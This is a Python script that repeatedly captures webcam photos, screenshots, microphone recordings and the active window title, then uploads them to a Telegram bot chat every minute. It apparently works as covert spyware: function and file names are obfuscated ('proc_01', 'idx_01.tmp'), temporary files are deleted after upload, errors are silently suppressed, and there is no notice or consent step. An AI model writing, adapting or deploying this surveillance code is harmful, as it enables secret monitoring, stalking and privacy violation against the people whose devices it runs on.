import os
import time
import cv2
import sounddevice as sd
from scipy.io import wavfile
import requests
from dotenv import load_dotenv
from PIL import ImageGrab
import numpy as np
import tempfile

# Platform specific imports
try:
    import pygetwindow as gw
except ImportError:
    gw = None

load_dotenv()

# Configuration
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
T_01 = os.getenv("TOPIC_WEBCAM")
T_02 = os.getenv("TOPIC_SCREENSHOT")
T_03 = os.getenv("TOPIC_AUDIO")
T_GEN = os.getenv("TOPIC_GENERAL")

SYNC_VAL = 60  
A_LEN = 5  
S_RATE = 44100

def get_p_path(f_name):
    return os.path.join(tempfile.gettempdir(), f_name)

def get_ctx():
    if gw:
        try:
            w = gw.getActiveWindow()
            return w.title if w else "IDLE"
        except Exception:
            return "ERR"
    return "N/A"

def proc_01(f):
    c = cv2.VideoCapture(0)
    if not c.isOpened():
        return False
    time.sleep(0.5)
    r, fr = c.read()
    if r:
        cv2.imwrite(f, fr)
    c.release()
    return r

def proc_02(f):
    try:
        s = ImageGrab.grab()
        s.save(f)
        return True
    except Exception:
        return False

def proc_03(f):
    try:
        rec = sd.rec(int(A_LEN * S_RATE), samplerate=S_RATE, channels=1)
        sd.wait()
        wavfile.write(f, S_RATE, rec)
        return True
    except Exception:
        return False

def sync_data(ctx, f1, f2, f3):
    u_p = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    u_d = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    
    msg = f"CTX: {ctx}"
    
    def push(u, t, tid, cap, fls):
        p = {"chat_id": CHAT_ID, "caption": cap}
        if tid:
            p["message_thread_id"] = tid
        try:
            r = requests.post(u, data=p, files=fls)
            res = r.json()
            if not res.get("ok") and tid == "1":
                del p["message_thread_id"]
                requests.post(u, data=p, files=fls)
        except Exception:
            pass

    if os.path.exists(f2):
        with open(f2, "rb") as f:
            push(u_p, "p", T_02, f"LOG_S\n{msg}", {"photo": f})
            
    if os.path.exists(f1):
        with open(f1, "rb") as f:
            push(u_p, "p", T_01, f"LOG_W\n{msg}", {"photo": f})

    if os.path.exists(f3):
        with open(f3, "rb") as f:
            push(u_d, "d", T_03, f"LOG_A\n{msg}", {"document": f})

def main():
    if not TOKEN or not CHAT_ID:
        return

    # Generic system paths
    p1 = get_p_path("idx_01.tmp")
    p2 = get_p_path("idx_02.tmp")
    p3 = get_p_path("idx_03.tmp")

    try:
        while True:
            ctx = get_ctx()
            
            proc_01(p1)
            proc_02(p2)
            proc_03(p3)
            
            sync_data(ctx, p1, p2, p3)
            
            for p in [p1, p2, p3]:
                if os.path.exists(p):
                    try:
                        os.remove(p)
                    except Exception:
                        pass
            
            time.sleep(SYNC_VAL)
            
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
